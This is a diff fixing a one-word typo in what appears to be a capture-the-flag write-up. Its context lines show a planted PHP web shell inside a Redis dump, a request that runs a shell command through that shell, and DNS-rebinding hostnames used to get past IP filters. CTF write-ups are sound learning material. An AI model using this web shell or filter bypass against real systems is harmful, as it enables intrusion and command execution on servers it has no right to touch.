@@ -59,7 +59,7 @@ Sending request to: 'http://170552050:80/shell.php?command=cat $(find / -name fl
 REDIS0006ş  flag!BsidesTLV2020{Y0u_4r3_A_Genius!!} mykey22<?php echo "\n"; system($_GET['command']); exit;?>ÿÙ�ÈŞÀRfİ
 ```
 
-Another options is to use a DNS mapping service such as [1u.ms](1u.ms) or [nip.io](nip.io) that map a subdomain to an IP address based on the subdomain name:
+Another option is to use a DNS mapping service such as [1u.ms](1u.ms) or [nip.io](nip.io) that map a subdomain to an IP address based on the subdomain name:
 
 ```python
 IP_ADDR = "make-10.42.106.242-rr.1u.ms"
